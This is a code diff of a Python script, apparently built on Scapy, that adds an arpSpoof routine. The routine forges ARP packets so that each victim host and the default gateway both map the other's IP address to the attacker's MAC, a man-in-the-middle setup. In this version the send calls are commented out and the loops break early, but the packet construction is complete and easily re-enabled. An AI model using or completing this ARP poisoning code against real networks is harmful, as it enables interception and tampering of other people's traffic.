@@ -16,7 +16,7 @@ def getLocalhostAddress():
     l=[]
     c = wmi.WMI() #create wmi object
     for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1):
-        return interface.DefaultIPGateway[0],interface.IPAddress[0],interface.MACAddress[0]
+        return interface.DefaultIPGateway[0],interface.IPAddress[0],interface.MACAddress
 
 def getLocalAddrss():
     """
@@ -45,9 +45,15 @@ def arpSpoof(localAddresses,defaultGateway,localMAC):
     while True:
         for ip in localAddresses.keys():
             if ip != defaultGateway:
-                #create arp broadcast packet
-                a = Ether(dst=localAddresses[ip])/ARP(op='is-at', hwsrc='00:00:00:00:00:00',psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
-                sendp(a)
+                #create arp packets
+                victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=1, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
+                victimPacket.show()
+                gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=1,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
+                gatewayPacket.show()
+                #send(victimPacket)
+                #send(gatewayPacket)
+            break
+        break
 
 
 def main():
